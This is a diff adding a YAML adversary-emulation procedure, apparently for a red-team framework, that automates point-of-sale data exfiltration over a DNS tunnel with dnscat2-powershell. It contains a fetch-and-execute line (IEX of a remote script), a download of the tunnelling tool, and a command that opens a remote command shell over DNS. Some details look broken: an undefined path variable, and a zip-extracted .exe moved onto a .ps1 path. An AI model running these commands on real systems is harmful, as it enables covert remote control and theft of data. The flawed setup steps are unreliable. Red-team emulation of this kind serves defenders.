@@ -1,0 +1,50 @@
+- id: e74554b8-0bc9-3d50-95a4-e45421925b49
+  name: dnscat2-powershell Exfiltration
+  description: Powershell to execute POS data exfiltration over DNS tunnel via dnscat2
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol'
+  cti_source: https://exchange.xforce.ibmcloud.com/threat-group/f8409554b71a79792ff099081bc5ac24
+  procedure_group: procedure_pos_exfiltration
+  procedure_step: '5.5'
+  platforms:
+    windows:
+      psh:
+        command: |
+          import-module #{file_path}\\dnscat2.ps1
+          Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd
+        payloads:
+        - dnscat2.ps1
+  input_arguments:
+    dnscat_ps1:
+      description: Path of dnscat2.ps1
+      type: Path
+      default: C:\ProgramData\dnscat2.ps1
+    dnscat2_url:
+      description: Path to download dnscat2 .ps1 file
+      type: URL
+      default: https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1
+    dnscat2_hash:
+      description: File hash of the dnscat2 .ps1 file
+      type: String
+      default: 953CF938A09DDD4DB5FCB6EE3439ABCA6EF47740A8C0F4B062CB8E2BB23BE0C3
+    dnscat2_server:
+      description: IP address
+      type: string
+      default: 127.0.0.1
+  dependency_executor_name: dnscat2.ps1
+  dependencies:
+  - description: dnscat2.ps1 must exist on disk at specified location (#{dnscat_ps1})
+    prereq_command: if (Test-Path \#{dnscat_ps1}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{dnscat_ps1}"; $zippath = "$parentpath\dnscat2.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{dnscat2_url}" "$zippath" \#{dnscat2_hash}){
+      Expand-Archive $zippath $parentpath\dnscat2 -Force
+      Move-Item $parentpath\dnscat2\dnscat2.exe "#{dnscat_ps1}"
+      Remove-Item $zippath, $parentpath\dnscat2 -Recurse
+      }
+  executors:
+  - name: powershell
+    command: "Start-Dnscat2 -Domain #{dnscat2_server} Exec cmd"
